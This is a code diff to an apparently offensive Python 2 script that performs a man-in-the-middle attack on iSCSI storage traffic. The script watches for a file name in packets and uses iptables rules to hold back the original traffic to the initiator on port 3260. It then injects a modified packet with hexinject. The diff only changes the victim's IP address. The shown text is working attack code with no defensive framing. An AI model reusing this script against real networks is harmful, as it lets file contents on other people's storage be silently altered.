@@ -13,7 +13,7 @@ while(running):
 		if( '74 65 73 74 2E 74 78 74' in packet):
 			# then block the MITM outgoing trafic to the initiator machine on the iscsi port 3260. With that, the file original content won't pass and we can inject our packet
 			if (not rule_added):
-				os.system("iptables -A OUTPUT -p tcp -d 192.168.1.191 --dport 3260 -j DROP")
+				os.system("iptables -A OUTPUT -p tcp -d 192.168.1.190 --dport 3260 -j DROP")
 				os.system("/sbin/iptables-save")
 				rule_added = True
 			print "found file name!"
@@ -26,7 +26,7 @@ while(running):
 			#packet_file.write(packet_read)
 			print " packet modified: - - - " + packet
 			# reopen traffic to port 3260 and inject the packets with the new modified packet
-			os.system("iptables -D OUTPUT -p tcp -d 192.168.1.191 --dport 3260 -j DROP")
+			os.system("iptables -D OUTPUT -p tcp -d 192.168.1.190 --dport 3260 -j DROP")
 			os.system("/sbin/iptables-save")
 			os.system("echo '"  + packet + "' | hexinject -p -i eth0")
 			running = False
